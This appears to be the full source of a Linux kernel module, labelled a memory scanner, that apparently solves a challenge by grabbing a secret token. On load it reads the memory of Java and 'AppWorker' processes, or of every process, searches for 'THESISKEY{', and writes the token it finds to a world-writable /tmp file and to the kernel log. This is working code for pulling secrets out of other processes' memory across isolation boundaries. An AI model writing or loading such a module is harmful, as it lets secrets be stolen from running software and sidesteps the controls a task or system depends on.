#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/highmem.h>
#include <linux/pagemap.h>
#include <linux/slab.h>
#include <linux/pid.h>
#include <linux/version.h>
#include <asm/pgtable.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("researcher");
MODULE_DESCRIPTION("Memory scanner");

#define SEARCH_STR "THESISKEY{"
#define SEARCH_LEN 10
#define BUF_SIZE (4096)

static struct file *out_file = NULL;

static void write_result(const char *data, size_t len) {
    if (!out_file) return;
    kernel_write(out_file, data, len, &out_file->f_pos);
}

static int scan_process_memory(struct task_struct *task) {
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    char *buf;
    char result[512];
    int found = 0;

    mm = get_task_mm(task);
    if (!mm) return 0;

    buf = kmalloc(BUF_SIZE + SEARCH_LEN, GFP_KERNEL);
    if (!buf) {
        mmput(mm);
        return 0;
    }

    mmap_read_lock(mm);

    VMA_ITERATOR(vmi, mm, 0);
    for_each_vma(vmi, vma) {
        unsigned long addr = vma->vm_start;

        if (!(vma->vm_flags & VM_READ)) continue;

        while (addr < vma->vm_end) {
            struct page *page;
            void *kaddr;
            unsigned long remaining;
            unsigned long page_size;

            // Get physical page
            if (get_user_pages_remote(mm, addr, 1, 0, &page, NULL, NULL) <= 0) {
                addr += PAGE_SIZE;
                continue;
            }

            kaddr = kmap(page);
            page_size = PAGE_SIZE;
            remaining = vma->vm_end - addr;
            if (remaining < page_size) page_size = remaining;

            // Search for THESISKEY{
            char *p = (char *)kaddr;
            int i;
            for (i = 0; i < (int)(page_size - SEARCH_LEN); i++) {
                if (memcmp(p + i, SEARCH_STR, SEARCH_LEN) == 0) {
                    int j;
                    // Found! Extract the token
                    snprintf(result, sizeof(result), "FOUND pid=%d name=%s addr=0x%lx: ", 
                             task->pid, task->comm, addr + i);
                    write_result(result, strlen(result));

                    // Copy token bytes
                    for (j = i; j < (int)page_size && j < i + 200; j++) {
                        if (p[j] == '\0' || p[j] == '\n') break;
                        result[j - i] = p[j];
                    }
                    result[j - i] = '\n';
                    result[j - i + 1] = '\0';
                    write_result(result, j - i + 1);
                    found++;

                    pr_info("readmem: FOUND TOKEN: %s\n", result);
                }
            }

            kunmap(page);
            put_page(page);
            addr += PAGE_SIZE;
        }
    }

    mmap_read_unlock(mm);
    kfree(buf);
    mmput(mm);

    return found;
}

static int __init readmem_init(void) {
    struct task_struct *task;
    int total = 0;
    char header[256];

    pr_info("readmem: Starting memory scan\n");

    // Open output file
    out_file = filp_open("/tmp/thesis-ipc/token.txt", O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (IS_ERR(out_file)) {
        pr_err("readmem: Cannot open output file: %ld\n", PTR_ERR(out_file));
        out_file = NULL;
    }

    // Scan all processes
    for_each_process(task) {
        snprintf(header, sizeof(header), "Scanning pid=%d name=%s\n", task->pid, task->comm);
        write_result(header, strlen(header));

        if (strcmp(task->comm, "java") == 0 || strcmp(task->comm, "AppWorker") == 0) {
            pr_info("readmem: Found java process pid=%d\n", task->pid);
            total += scan_process_memory(task);
        }
    }

    if (total == 0) {
        // Scan all processes if java not found
        write_result("Scanning all processes...\n", 25);
        for_each_process(task) {
            total += scan_process_memory(task);
        }
    }

    snprintf(header, sizeof(header), "Done. Total found: %d\n", total);
    write_result(header, strlen(header));

    if (out_file) filp_close(out_file, NULL);

    pr_info("readmem: Done. VMAs scanned, found: %d\n", total);
    return 0;
}

static void __exit readmem_exit(void) {
    pr_info("readmem: Module removed\n");
}

module_init(readmem_init);
module_exit(readmem_exit);
